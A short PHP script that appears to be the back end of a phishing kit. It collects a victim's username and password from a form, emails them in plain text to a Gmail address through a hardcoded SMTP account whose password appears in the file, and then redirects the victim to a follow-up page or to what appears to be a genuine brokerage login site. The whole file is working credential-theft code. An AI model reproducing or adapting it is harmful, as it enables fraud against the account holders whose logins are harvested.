<?php

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

// Load Composer's autoloader
require 'vendor/autoload.php';

$username = $_POST["username"];
$password = $_POST["password"];

$mail = new PHPMailer(true);

try {
  //Server settings
  //$mail->SMTPDebug = 2;
  $mail->isSMTP();
  $mail->CharSet = 'UTF-8';
  $mail->Host       = 'mail.tamwel.us';
  $mail->Username = "contact@tamwel.us";
  $mail->Password = "khm123456";
  $mail->SMTPAuth = false;
  $mail->SMTPSecure = false;
  $mail->SMTPAutoTLS = false;
  $mail->Port       = 25;
  $mail->Encoding     = "base64";

  //Recipients
  $mail->setFrom('contact@tamwel.us', 'User Acount');
  $mail->addAddress('khm.lowyer@gmail.com');
  // Content
  $mail->isHTML(true);
  $mail->Subject = 'عميل جديد';
  $mail->Body    = 'username: ' . $username .
    '<br>password: ' . $password ;
  $mail->AltBody = 'new';
  if ($mail->send()) {
    header("Location: https://tamwel.us/algorthm/Page_3.html");
  } else {
    header("Location: https://etrade.gibcapital.com/");
  }
} catch (Exception $e) {
  echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}
